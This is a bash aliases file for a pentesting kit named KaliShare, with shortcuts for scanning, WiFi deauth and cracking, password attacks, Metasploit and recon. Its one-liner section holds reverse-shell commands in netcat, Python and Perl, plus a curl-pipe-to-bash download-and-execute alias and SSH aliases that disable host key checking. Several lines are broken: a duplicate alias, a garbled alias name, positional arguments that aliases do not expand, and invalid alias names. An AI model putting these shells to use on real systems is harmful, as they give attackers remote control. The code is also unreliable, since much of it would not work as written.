# ====================================================================
# KALISHARE ALIASES & SHORTCUTS
# Quick commands for expert pentesters
# ====================================================================

# ═══════════════════════════════════════════════════════════════
# NETWORK ALIASES
# ═══════════════════════════════════════════════════════════════

alias ns="nmap -sn"                           # Quick scan
alias nf="nmap -sV -p-"                       # Full port scan
alias nu="nmap -sU"                           # UDP scan
alias nv="nmap -sV"                           # Version detection
alias no="nmap -O"                            # OS detection
alias ns="nmap --script vuln"                 # Vuln scan
alias nc="netcat -nv"                         # Netcat verbose
alias nc-listener="nc -lvp 4444"              # NC listener
alias nc-reverse="nc -e /bin/bash"            # Reverse shell
alias mscan="masscan --rate=10000"            # Fast masscan
alias mt="mitmproxy"                          # MITM proxy
alias wshark="wireshark -k"                   # Wireshark
alias tcdump="tcpdump -i any"                 # Tcpdump

# ═══════════════════════════════════════════════════════════════
# WIFI ALIASES
# ═══════════════════════════════════════════════════════════════

alias wm-start="airmon-ng start wlan0"        # Monitor mode
alias wm-stop="airmon-ng stop wlan0mon"       # Disable monitor
alias ws="airodump-ng wlan0mon"               # WiFi scan
alias wc="airodump-ng --bssid"                # Capture handshake
alias wd="aireplay-ng --deauth"               # Deauth attack
alias ac="aircrack-ng -w"                     # Crack handshake
alias wf="wifite"                             # Wifite
alias flux="fluxion"                          # Fluxion
alias wps="reaver -i wlan0mon -b"             # WPS attack

# ═══════════════════════════════════════════════════════════════
# WEB ALIASES
# ═══════════════════════════════════════════════════════════════

alias nk="nikto -h"                          # Nikto scan
alias sm="sqlmap -u --batch"                 # SQLMap
alias gb="gobuster dir -u"                   # Gobuster
alias db="dirb"                              # Dirb
alias ww="whatweb"                           # WhatWeb
alias wp="wpscan --url"                      # WPScan
alias curl="curl -sSL"                       # Curl quiet
alias wfuzz="wfuzz -c"                       # Fuzzing

# ═══════════════════════════════════════════════════════════════
# PASSWORD ALIASES
# ═══════════════════════════════════════════════════════════════

alias hc="hashcat -m 0"                      # Hashcat
alias jn="john --wordlist="                   # John
alias hyd="hydra -L -P"                      # Hydra
alias med="medusa -h -U -P"                  # Medusa
alias crow="crowbar -b"                      # Crowbar
alias hx="hashid"                            # Hash identify
alias mk="maskprocessor"                     # Mask attack

# ═══════════════════════════════════════════════════════════════
# EXPLOIT ALIASES
# ═══════════════════════════════════════════════════════════════

alias msf="msfconsole -q"                     # Metasploit quiet
alias msfv="msfvenom -p"                      # msfvenom
alias ss="searchsploit"                      # Searchsploit
alias sse="searchsploit -e"                  # Exact search
alias ep="msfconsole -x"                     # Quick msf command

# ═══════════════════════════════════════════════════════════════
# RECON ALIASES
# ═══════════════════════════════════════════════════════════════

alias who="whois"                             # Whois
alias dns="dnsenum"                           # DNSenum
alias dmap="dnsmap"                           # DNSmap
alias th="theHarvester -d"                   # Harvester
alias sub="sublist3r -d"                      # Sublist3r
alias subf="subfinder -d"                    # Subfinder
alias amass="amass enum -d"                   # Amass
alias recon="recon-ng"                        # Recon-ng
alias sf="spiderfoot-cli -s"                  # SpiderFoot

# ═══════════════════════════════════════════════════════════════
# SYSTEM ALIASES
# ═══════════════════════════════════════════════════════════════

alias psg="ps aux | grep -v grep | grep"     # Process grep
alias ff="find / -name"                      # Find file
alias语的="alias"                              # Show aliases
alias vsm="vim"                               # Vim
alias tm="tmux new -s"                        # New tmux
alias ta="tmux attach -t"                    # Attach tmux
alias tl="tmux list-sessions"                # List tmux
alias htop="htop"                             # Htop
alias top="bpytop"                           # Better top

# ═══════════════════════════════════════════════════════════════
# FILE ALIASES
# ═══════════════════════════════════════════════════════════════

alias ll="ls -lah"                           # List all
alias la="ls -A"                             # List hidden
alias l="ls -CF"                            # List classified
alias ..="cd .."                             # Parent dir
alias ...="cd ../.."                         # Grandparent
alias ~="cd ~"                               # Home
alias --="cd -"                              # Previous dir
alias ssha="ssh -o StrictHostKeyChecking=no" # SSH no prompt
alias scpr="scp -o StrictHostKeyChecking=no" # SCP no prompt

# ═══════════════════════════════════════════════════════════════
# KALISHARE ALIASES
# ═══════════════════════════════════════════════════════════════

alias go="bash $KALI_SHARE/cli/go"            # Go command
alias go-help="$KALI_SHARE/cli/go help"      # Go help
alias widget="$KALI_SHARE/scripts/tool-widget.sh" # Tool widget
alias essential="$KALI_SHARE/scripts/essential-tools.sh" # Essential tools
alias validate="$KALI_SHARE/cli/go validate" # Validate tools
alias status="$KALI_SHARE/cli/go status"     # System status

# ═══════════════════════════════════════════════════════════════
# QUICK ONE-LINERS
# ═══════════════════════════════════════════════════════════════

# Reverse shells
alias rs-bash='nc -e /bin/bash $1 $2'
alias rs-python='python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\"$1\",$2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"'
alias rs-perl='perl -e "use Socket;\$i=\"$1\";\$p=$2;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i))) && exec \"/bin/sh -i\""'

# Port forwarding
alias pf-local='ssh -L $1:localhost:$2 $3'
alias pf-remote='ssh -R $1:localhost:$2 $3'

# Download & Execute
alias dl-exec='curl -sSL $1 | bash'
alias dl-file='wget -O $2 $1'

# Encoding
alias b64-en='echo $1 | base64'
alias b64-de='echo $1 | base64 -d'
alias url-en='python3 -c "import urllib.parse; print(urllib.parse.quote(\"$1\"))"'
alias url-de='python3 -c "import urllib.parse; print(urllib.parse.unquote(\"$1\"))"'

# Hashing
alias md5='md5sum'
alias sha1='sha1sum'
alias sha256='sha256sum'

# ═══════════════════════════════════════════════════════════════
# CUSTOM FUNCTIONS
# ═══════════════════════════════════════════════════════════════

function kali-ip() {
    ip addr | grep inet | grep -v127.0.0.1 | awk '{print $2}'
}

function kali-up() {
    ping -c 1 8.8.8.8 >/dev/null 2>&1 && echo "Online" || echo "Offline"
}

function ports() {
    netstat -tuln | grep LISTEN
}

function myip() {
    curl -sSL ifconfig.me && echo ""
}

function exploit-db() {
    searchsploit -c "$1"
}

function wordlist() {
    ls /usr/share/wordlists/ | head -20
}

# ═══════════════════════════════════════════════════════════════
# EXPORT TO BASHRC
# ═══════════════════════════════════════════════════════════════

export KALI_SHARE="/root/KaliShare"

# Add to ~/.bashrc:
# source /root/KaliShare/aliases.sh

# ═══════════════════════════════════════════════════════════════
# KEYBOARD SHORTCUTS (BIND)
# ═══════════════════════════════════════════════════════════════

# Add to ~/.inputrc for readline shortcuts:
# "\e[1~": beginning-of-line      # Home
# "\e[4~": end-of-line            # End
# "\e[5~": beginning-of-history   # PageUp
# "\e[6~": end-of-history         # PageDown
# "\e[3~": delete-char            # Delete
# "\e[2~": quoted-insert           # Insert